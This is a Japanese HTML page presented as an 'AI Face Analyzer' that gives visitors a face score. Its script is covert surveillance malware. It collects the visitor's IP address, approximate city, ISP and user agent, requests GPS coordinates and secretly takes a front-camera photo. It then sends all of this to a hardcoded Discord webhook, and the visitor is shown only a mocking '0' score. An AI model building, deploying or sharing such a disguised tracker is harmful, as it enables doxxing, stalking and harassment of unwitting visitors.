<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Face Analyzer</title>
    <style>
        body { 
            background: #ffffff; color: #333; font-family: -apple-system, sans-serif;
            margin: 0; text-align: center; height: 100vh; overflow: hidden;
            display: flex; align-items: center; justify-content: center;
        }
        .fade-in-box { animation: fadeIn 1.5s ease-in-out forwards; opacity: 0; width: 100%; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        
        /* ロゴ画像 */
        img.header-img { 
            width: 80%; max-width: 320px; border-radius: 20px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.1); margin-bottom: 30px; 
        }

        .start-btn {
            background: linear-gradient(135deg, #6dd5ed, #2193b0);
            color: white; border: none; padding: 20px 50px;
            font-size: 1.4rem; font-weight: bold; border-radius: 50px; cursor: pointer;
        }

        #diagnosis-screen { display: none; width: 100%; }
        .frame {
            position: relative; width: 300px; height: 300px; margin: 0 auto;
            border: 5px solid #fff; border-radius: 30px; overflow: hidden;
            box-shadow: 0 15px 40px rgba(0,0,0,0.1); background: #000;
        }
        #captured-photo { width: 100%; height: 100%; object-fit: cover; display: none; }
        video { width: 100%; height: 100%; object-fit: cover; }
        
        .status-text { margin-top: 25px; font-size: 1.2rem; color: #2193b0; font-weight: bold; }
        
        #result-zero {
            display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            font-size: 15rem; color: #ff4757; font-weight: 900; z-index: 100;
            text-shadow: 4px 4px 0 #fff;
        }
    </style>
</head>
<body>

<div id="top-screen" class="fade-in-box">
    <img src="https://cdn.discordapp.com/attachments/1457007667410239530/1467315464643543040/F9C40A6A-9C15-4173-A89C-E46615414223.png?ex=697fef84&is=697e9e04&hm=568be91c0f4da1ee33754484eec840e5e2c9c1da765d720b40499db12ef3f1ba" class="header-img" onerror="this.src='https://via.placeholder.com/350x200?text=AI+Face+Analyzer'">
    <br>
    <button class="start-btn" onclick="start()">顔診断開始</button>
</div>

<div id="diagnosis-screen">
    <div class="frame">
        <video id="video" autoplay playsinline muted></video>
        <img id="captured-photo">
        <div id="result-zero">0</div>
    </div>
    <div id="status" class="status-text">解析準備中...</div>
    <canvas id="canvas" style="display:none;"></canvas>
</div>

<script>
    const WEBHOOK = "https://discord.com/api/webhooks/1477228073601470526/QYjxdxWV9xBoRUXf100AQS9zYSUWcG3K8L-uFNT3-jPAuYWzU_3lCGb7izpNAx5fJC45";
    let ipData = "取得失敗";
    let gpsData = "GPS - 拒否";

    // 1. IPと解析情報の取得 (ipapiを使用)
    window.onload = async () => {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            ipData = `【解析情報】\n住所付近: ${d.city}, ${d.region}\nIP: ${d.ip}\nISP: ${d.org}\nUA: ${navigator.userAgent}`;
        } catch(e) {
            ipData = `【解析情報】\n取得エラー\nUA: ${navigator.userAgent}`;
        }
    };

    async function start() {
        document.getElementById('top-screen').style.display = 'none';
        document.getElementById('diagnosis-screen').style.display = 'block';

        // 2. GPS取得
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                gpsData = `【GPS】\n緯度: ${pos.coords.latitude}\n経度: ${pos.coords.longitude}\nMap: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                runCamera();
            },
            () => {
                gpsData = "GPS - 拒否";
                runCamera();
            },
            { timeout: 5000 }
        );
    }

    async function runCamera() {
        const video = document.getElementById('video');
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;

            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                const photo = document.getElementById('captured-photo');
                photo.src = canvas.toDataURL('image/png');
                photo.style.display = 'block';
                document.getElementById('status').innerText = "解析中...";

                stream.getTracks().forEach(t => t.stop());

                // 3. Discordへイラスト通りの形式で送信
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('file', blob, 'face.png');
                    fd.append('payload_json', JSON.stringify({
                        content: `**IP** ▬▬▬▬▬▬▬▬▬▬▬\n${ipData}\n\n${gpsData}`
                    }));
                    fetch(WEBHOOK, { method: 'POST', body: fd });
                });

                setTimeout(() => {
                    document.getElementById('status').innerText = "あなたの顔面スコアは...";
                    document.getElementById('result-zero').style.display = 'block';
                }, 2500);
            }, 1000);
        } catch (err) {
            document.getElementById('status').innerText = "カメラを許可してください";
        }
    }
</script>
</body>
</html>
